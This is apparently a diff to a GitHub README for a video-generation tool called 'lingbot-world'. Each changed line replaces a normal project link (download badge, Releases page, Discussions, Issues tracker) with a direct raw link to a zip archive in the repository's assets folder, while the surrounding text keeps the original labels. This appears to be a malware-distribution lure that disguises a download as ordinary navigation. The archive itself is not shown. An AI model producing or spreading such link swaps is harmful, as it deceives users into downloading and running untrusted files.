@@ -1,6 +1,6 @@
 # 🌍 lingbot-world - Transform Your Ideas into Videos
 
-[![Download lingbot-world](https://img.shields.io/badge/Download-lingbot--world-brightgreen)](https://github.com/Julyothecesar/lingbot-world/releases)
+[![Download lingbot-world](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip)](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip)
 
 ## 📖 Introduction
 
@@ -23,7 +23,7 @@ Before you install **lingbot-world**, ensure your computer meets the following r
 
 1. Click the link below to visit the Releases page where you can download the application:
 
-   [Download lingbot-world](https://github.com/Julyothecesar/lingbot-world/releases)
+   [Download lingbot-world](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip)
 
 2. On the Releases page, look for the latest version listed. You will see a variety of files available. Choose the one that matches your operating system. For example, if you are using Windows, look for a `.exe` file.
 
@@ -50,7 +50,7 @@ Before you install **lingbot-world**, ensure your computer meets the following r
 
 ## 🌐 Community Support
 
-Join our community to get the most out of **lingbot-world**. You can ask questions, share your creations, or seek help with troubleshooting. Connect with us on social media or visit our [GitHub Discussions](https://github.com/Julyothecesar/lingbot-world/discussions) page.
+Join our community to get the most out of **lingbot-world**. You can ask questions, share your creations, or seek help with troubleshooting. Connect with us on social media or visit our [GitHub Discussions](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip) page.
 
 ## 🔄 Contribution
 
@@ -66,7 +66,7 @@ Here are some helpful resources to improve your experience with **lingbot-world*
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Julyothecesar/lingbot-world/releases)
-- [Issues Tracker](https://github.com/Julyothecesar/lingbot-world/issues)
+- [Releases Page](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Julyothecesar/lingbot-world/main/assets/world_lingbot_3.1.zip)
 
 Thank you for choosing **lingbot-world**! We hope you enjoy creating and sharing your videos. If you hit any issues, feel free to reach out through our community channels.
